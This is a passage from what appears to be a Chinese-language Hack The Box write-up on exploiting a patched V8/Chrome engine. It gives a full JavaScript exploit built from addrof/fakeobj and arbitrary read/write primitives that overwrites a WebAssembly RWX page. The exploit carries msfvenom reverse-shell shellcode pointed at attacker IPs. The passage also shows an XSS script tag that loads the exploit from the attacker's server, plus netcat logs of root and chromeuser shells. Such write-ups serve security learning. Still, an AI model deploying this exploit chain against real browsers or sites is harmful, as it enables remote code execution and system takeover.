class="line">[+] Searching <span class="string">&#x27;\x00\xa0\x08\x54\xfc\x15\x00\x00&#x27;</span> <span class="keyword">in</span> memory</span><br><span class="line">[+] In (0x190908080000-0x19090818d000), permission=rw-</span><br><span class="line">  0x1909080874e0 - 0x190908087500  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x19090808752c - 0x19090808754c  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x190908200000-0x190908280000), permission=rw-</span><br><span class="line">  0x190908211178 - 0x190908211198  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In <span class="string">&#x27;[heap]&#x27;</span>(0x55555648d000-0x55555658b000), permission=rw-</span><br><span class="line">  0x5555564dddc8 - 0x5555564ddde8  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de2c8 - 0x5555564de2e8  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de3a0 - 0x5555564de3c0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de4c0 - 0x5555564de4e0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de510 - 0x5555564de530  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555565775e0 - 0x555556577600  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7fffe8000000-0x7fffe8023000), permission=rw-</span><br><span class="line">  0x7fffe8000970 - 0x7fffe8000990  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7ffff0000000-0x7ffff0023000), permission=rw-</span><br><span class="line">  0x7ffff0006d90 - 0x7ffff0006db0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7ffff56c4000-0x7ffff5ec4000), permission=rw-</span><br><span class="line">  0x7ffff5ec2820 - 0x7ffff5ec2840  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7ffff5ec5000-0x7ffff70c9000), permission=rw-</span><br><span class="line">  0x7ffff66c3820 - 0x7ffff66c3840  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x7ffff66c38a0 - 0x7ffff66c38c0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span></span><br><span class="line">gef➤  p 0x0000190900000000 + 0x82111c9</span><br><span class="line"><span class="variable">$2</span> = 0x1909082111c9</span><br><span class="line">gef➤  p 0x190908211178 - 0x1909082111c9</span><br><span class="line"><span class="variable">$3</span> = 0xffffffffffffffaf</span><br></pre></td></tr></table></figure>
+
+<p>解决上面的问题，需要知道如何使用DataView和ArrayBuffer，因为这将帮助用所需的值覆盖地址，简而言之，这两个函数允许使用ArrayBuffer以二进制格式写入数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(<span class="string">&quot;[+] Wasm instance address: 0x&quot;</span> + wasm_instance_addr.toString(16));</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] RWX INSTANCE:   0x&quot;</span> + rwx.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var arr_buf = new ArrayBuffer(0x100);</span><br><span class="line">var dataview = new DataView(arr_buf);</span><br></pre></td></tr></table></figure>
+
+<p>ArrayBuffer的后备存储可以看作是JSArray的元素指针。它可以在offset &amp;ArrayBuffer+0x14找到，可以通过使用d8二进制文件的x64.debug版本找到它。其原理是，不使用fakeobj直接写入任意地址，而是使用fakeobj执行arb-write操作，并修改合法ArrayBuffer的后备存储到任意地址，在本例中，该后备存储将被rwx段覆盖。现在，可以使用dataview.setBigUint64(0, val, true)将val作为64位小端值写入任意地址。如下所示:</p>
+<ul>
+<li>使用msfvenom生成shellcode并放入以下的js代码中</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.177.128 LPORT=4222 -f num</span><br><span class="line"></span><br><span class="line">0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">0xb9, 0x02, 0x00, 0x10, 0x7e, 0xc0, 0xa8, 0xb1, 0x80, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var arr_buf_addr = addrof(arr_buf) &amp; 0xffffffffn;;</span><br><span class="line">var back_store_addr = arb_read(arr_buf_addr + 0x14n);</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] ArrayBuffer address: 0x&quot;</span> + arr_buf_addr.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[+] Back store pointer: 0x&quot;</span> + back_store_addr.toString(16));</span><br><span class="line"></span><br><span class="line">arb_write(arr_buf_addr + 0x14n, rwx);</span><br><span class="line"></span><br><span class="line">var shellcode = [</span><br><span class="line">    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">    0xb9, 0x02, 0x00, 0x10, 0x7e, 0xc0, 0xa8, 0xb1, 0x80, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">    0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">    0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br><span class="line">];  // shellcode <span class="keyword">for</span> spawning a reverse shell <span class="keyword">for</span> <span class="built_in">local</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">  dataview.setUint8(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在，只需要调用函数pwn就可以执行shellcode了:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn();</span><br></pre></td></tr></table></figure>
+
+<p>以.&#x2F;d8 .&#x2F;xpl.js的命令运行该漏洞js脚本，将能成功收到一个reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/v8/out.gn/x64.release<span class="comment"># ./d8 /root/v8build/rope2/xpl.js </span></span><br><span class="line">[*] Float array map   :  0x8241909</span><br><span class="line">[*] Regular array map :  0x8241869</span><br><span class="line">[+] Controlled RW helper address: 0x808733d</span><br><span class="line">[+] Wasm instance address: 0x8211631</span><br><span class="line">[*] RWX INSTANCE:   0x13211e50c000</span><br><span class="line">[+] ArrayBuffer address: 0x8087a85</span><br><span class="line">[+] Back store pointer: 0x55b70a9d4730</span><br><span class="line">[+] Spawning a shell...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb167.jpg"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/test]</span><br><span class="line">└─<span class="comment"># nc -lvp 4222</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4222</span><br><span class="line">Ncat: Listening on 0.0.0.0:4222</span><br><span class="line">Ncat: Connection from 192.168.177.151.</span><br><span class="line">Ncat: Connection from 192.168.177.151:47072.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux luci 4.15.0-132-generic <span class="comment">#136~16.04.1-Ubuntu SMP Tue Jan 12 18:22:20 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb168.jpg"></li>
+</ul>
+<p>在d8上有效,必须试试之前从端口8000下载的chrome二进制文件,运行攻击测试,制作一个HTML文件包含xpl.js文件,这里的想法是使用–no-sandbox最终意味着没有沙箱逃逸是和系统上执行的所有JIT代码HTML文件本身:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">       &lt;script src=<span class="string">&quot;xpl.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行给定的chrome二进制文件:.&#x2F;chrome&#x2F;chrome –no-sandbox .&#x2F;xpl.html会反弹一个reverse shell:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb169.jpg"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/test]</span><br><span class="line">└─<span class="comment"># nc -lvp 4222</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4222</span><br><span class="line">Ncat: Listening on 0.0.0.0:4222</span><br><span class="line">Ncat: Connection from 192.168.177.151.</span><br><span class="line">Ncat: Connection from 192.168.177.151:54750.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux luci 4.15.0-132-generic <span class="comment">#136~16.04.1-Ubuntu SMP Tue Jan 12 18:22:20 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用成功</p>
+<p>现在，先把这个放在一边，首先重新更改ip地址然后生成shellcode，使用这个漏洞来获得reverse shell，最终的漏洞利用js脚本看起来像这样:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4222 -f num</span><br><span class="line"></span><br><span class="line">0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">0xb9, 0x02, 0x00, 0x10, 0x7e, 0x0a, 0x0a, 0x0e, 0x0c, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>xpl.js</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];</span><br><span class="line">var obj = &#123;<span class="string">&quot;A&quot;</span>:1.1&#125;;</span><br><span class="line">var reg = [1, 2, 3, 4];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(8); // 8 byte array buffer</span><br><span class="line">var f64_buf = new Float64Array(buf);</span><br><span class="line">var u64_buf = new Uint32Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> ftoi(val, size) &#123;</span><br><span class="line"></span><br><span class="line">    f64_buf[0] = val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == 32) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(size == 64) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; <span class="string">32n);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function itof(val, size) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(size == 32) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">    &#125; else if(size == 64) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">        u64_buf[1] = Number(val &gt;&gt; 32n</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> f64_buf[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var float_arr_map = ftoi(float_arr.GetLastElement(), 32)</span><br><span class="line">var reg_arr_map = float_arr_map - 0xa0n;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] Float array map   :  0x&quot;</span> + float_arr_map.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[*] Regular array map :  0x&quot;</span> + reg_arr_map.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> addrof(in_obj) &#123;</span><br><span class="line">	float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">	float_arr[0] = in_obj;</span><br><span class="line">	float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">	<span class="built_in">let</span> addr = float_arr[0];</span><br><span class="line">	<span class="built_in">return</span> ftoi(addr, 64)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> fakeobj(addr) &#123;</span><br><span class="line">	float_arr[0] = itof(addr, 32);</span><br><span class="line">	float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">	<span class="built_in">let</span> fake = float_arr[0];</span><br><span class="line">	float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">	<span class="built_in">return</span> fake;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];</span><br><span class="line">var rw_helper_addr = addrof(rw_helper) &amp; 0xffffffffn;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] Controlled RW helper address: 0x&quot;</span> + rw_helper_addr.toString(16));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> arb_read(addr) &#123;</span><br><span class="line">    <span class="built_in">let</span> fake = fakeobj(rw_helper_addr - 0x20n);</span><br><span class="line">    rw_helper[1] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    return ftoi(fake[<span class="number">0</span>], <span class="number">64</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arb_write(addr, value) &#123;</span><br><span class="line">    let fake = fakeobj(rw_helper_addr - <span class="number">0</span>x20n);</span><br><span class="line">    rw_helper[<span class="number">1</span>] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(value, <span class="number">64</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var wasmCode = new Uint8Array([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,</span><br><span class="line">                               <span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,</span><br><span class="line">                               <span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">                               <span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,</span><br><span class="line">                               <span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line">var wasm_module = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_module);</span><br><span class="line">var pwn = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line">var wasm_instance_addr = addrof(wasm_instance) &amp; <span class="number">0</span>xffffffffn;</span><br><span class="line">var rwx = arb_read(wasm_instance_addr + <span class="number">0</span>x68n &amp; <span class="number">0</span>xffffffffn);</span><br><span class="line"></span><br><span class="line">console.log(&quot;[+] Wasm instance address: <span class="number">0</span>x&quot; + wasm_instance_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] RWX INSTANCE:   0x&quot;</span> + rwx.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var arr_buf = new ArrayBuffer(0x100);</span><br><span class="line">var dataview = new DataView(arr_buf);</span><br><span class="line"></span><br><span class="line">var arr_buf_addr = addrof(arr_buf) &amp; 0xffffffffn;;</span><br><span class="line">var back_store_addr = arb_read(arr_buf_addr + 0x14n);</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] ArrayBuffer address: 0x&quot;</span> + arr_buf_addr.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[+] Back store pointer: 0x&quot;</span> + back_store_addr.toString(16));</span><br><span class="line"></span><br><span class="line">arb_write(arr_buf_addr + 0x14n, rwx);</span><br><span class="line"></span><br><span class="line">var shellcode = [</span><br><span class="line">    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">    0xb9, 0x02, 0x00, 0x10, 0x7e, 0x0a, 0x0a, 0x0e, 0x0c, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">    0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">    0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br><span class="line">];  // shellcode <span class="keyword">for</span> spawning a reverse shell</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">  dataview.setUint8(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] Spawning a shell...&quot;</span>);</span><br><span class="line">pwn();</span><br></pre></td></tr></table></figure>
+
+<p>现在，问题是，应该把这个漏洞利用在哪里，在任何端口上都没有运行chrome实例，但随后,端口8000,在这一点上,评论模板可能XSS漏洞,这是唯一的方法,似乎可行,所以exploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.12/xpl.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>插入到消息框中,netcat监听器等待连接,得到了chromeuser的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/rope2<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.196 - - [24/Jan/2021 00:50:08] <span class="string">&quot;GET /xpl.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.196 - - [24/Jan/2021 00:50:31] <span class="string">&quot;GET /xpl.js HTTP/1.1&quot;</span> 200 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@luci:/home/user<span class="comment"># nc -lvp 4222</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4222)</span><br><span class="line">Connection from [10.10.10.196] port 4222 [tcp/*] accepted (family 2, sport 59342)</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(chromeuser) gid=1001(chromeuser) <span 